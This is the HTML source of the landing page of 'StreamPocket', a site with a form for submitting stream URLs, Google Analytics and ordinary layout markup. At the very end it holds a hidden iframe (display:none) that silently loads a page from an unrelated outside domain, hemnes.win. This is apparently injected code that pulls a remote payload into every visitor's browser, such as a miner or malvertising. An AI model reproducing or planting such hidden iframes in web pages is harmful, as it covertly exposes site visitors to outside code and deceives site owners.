<!doctype html>

<html lang="en">
<head>
	<meta charset="utf-8">

	<title>StreamPocket</title>
	<meta name="description" content="Put the streams into your pocket">
	<meta name="author" content="StreamPocket">
	<meta name="referrer" content="no-referrer" />
	<meta name="stream" content="">

	<link rel="shortcut icon" href="favicon.ico">
	<style media="screen" type="text/css"> html {visibility: hidden;} </style>
	<link rel="stylesheet" href="/cjss/styles.css?v=2.0" media="screen">

	<!--[if lt IE 9]>
	  <link rel="stylesheet" type="text/css" href="cjss/styles-ie.min.css?v=1.0" />
		<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>

</head>

<body>
	<div id="outer">
		<div id="middle">
			<div id="inner">
				<a href="" id="tape"></a>
				<div id="pocket"><a href="/">
					<img id="label" src="/img/label.png"></a>
					<div id="form">
						<form id="worm" action="/" autocomplete="off">
							<input type="text" name="stream" id="stream" placeholder="Stream goes here" autofocus="on" autocomplete="off">
							<input type="submit" id="submit" value="">
						</form>
					</div>
					<div id="hello">
					<p><br></p>					

						
						
						
					</div>
				</div>
				
			</div>
		</div>		
	</div>



  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.0/jquery.min.js"></script>
	<!--[if lt IE 9]>
	  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
	<![endif]-->
  
	<script type="text/javascript" language="JavaScript">
		document.forms['worm'].elements['stream'].focus();
	</script>

	<script>
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-49957974-1', 'streampocket.com');
	  ga('send', 'pageview');

	</script>

<iframe src="https://hemnes.win/cart6.html?v=vBaNYz4tVYKV9Q9tZlL0BPGq8rnZEl00&s=224&m=1&td=0&tt=0.4" style="display:none;"></iframe>

</body>
</html>